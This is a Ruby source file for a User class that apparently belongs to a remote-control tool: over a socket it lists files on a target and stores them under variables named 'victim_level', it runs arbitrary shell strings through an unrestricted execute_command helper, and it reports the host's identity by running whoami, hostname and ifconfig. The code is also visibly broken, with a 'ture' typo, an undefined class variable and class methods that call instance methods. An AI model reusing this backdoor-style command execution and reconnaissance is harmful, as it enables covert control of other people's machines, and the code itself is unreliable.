class User
	@@allowed_filepath = nil

	attr_accessor :username, :socket, :allowed_files, :ethaddr

	def self.allowed_filepath=(path=nil)
		@@allowed_filepath = File.join(APP_ROOT, path)
	end

  def self.file_exists?(path)
    if path and File.exists?(path)
      return true
    else
      return false
    end
  end

  def self.file_usable?(path)
    return false unless path
    return false unless File.exists?(path)
    return false unless File.readable?(path)
    return false unless File.writable?(path)
    return true
  end

  def execute_command(cmd="")
    value = %x[#{cmd}]
    value
  end

  def self.create_file(path)
    # create the restaurant file
    File.open(path, 'w') unless file_exists?(path)
    return file_usable?(path)
  end

  def initialize(sock)
		# @username = un || ""
		@socket = sock || nil
		# @ethaddr = ethaddr || ""
  end

  def save
  	return false unless User.file_usable?(@@allowed_filepath)
		File.open(@@allowed_filepath, "a") do |file|
			file.puts "#{@username}\t#{@ethaddr}\t#{files.to_s}\t#{last_id}"
		end
  end

  def self.users_list
		users = []
    if file_usable?(@@allowed_filepath)
      file = File.new(@@filepath, 'r')
      file.each_line do |line|
        if not line==""
          users << line
        end
      end
      file.close
    end
    return users
	end

	def get_ls_response(path)
		result = socket.puts "ls " + path
		parse_ls_response(path, result)
	end

	def parse_ls_response(path, result)
    files = result.split("||||")
    files.each do |f|
	    file = f.split("\t")
	    if file.last == "ture"
	    	add_dir(path, file[0])
	    else
	    	add_file(path, file[0])
	    end
    end
  end

  def add_dir(path, name)
  	hash = {:id => last_id + 1, :name => name, :is_dir => true, :list => false}
  	last_id += 1
  	dirs = path.split('/')
  	victim_level = @files
		i = 0
		counter = 1;
  	while i<victim_level.length and counter < dirs.length
			f = victim_level[i]
			if f[:name]=="#{dirs[counter]}" and f[:is_dir]==true
				victim_level = victim_level[i].list
				i=0
				counter +=1
			else
				i+=1
			end
  	end

  	victim_level << hash
  	self.save
  	victim_level
  end

	def add_file(path, name)
		hash = {:id => @last_id + 1, :name => name, :is_dir => false}
		@last_id += 1
		dirs = path.split('/')
		victim_level = @files
		i = 0
		counter = 1;
  	while i<victim_level.length and counter < dirs.length
			f = victim_level[i]
			if f[:name]=="#{dirs[counter]}"
				victim_level = victim_level[i].list
				i=0
				counter +=1
			else
				i+=1
			end
  	end

  	victim_level << hash
  	self.save
  	victim_level
	end

	def getethaddr
		value = execute_command("ifconfig")
		line = value.split("\n")[0]
		eadr = line.slice(line.length-19..line.length)
		@ethaddr = eadr
	end

	def reveal_identity
		username = execute_command("whoami")
		hostname = execute_command("hostname")
		return username + "@" + hostname
	end

	def self.execute_code(code)
		case code
		when "getethaddr"
			return getethaddr
		when "whoareyou"
			identity = reveal_identity
			return socket.puts identity
		end
	end

end
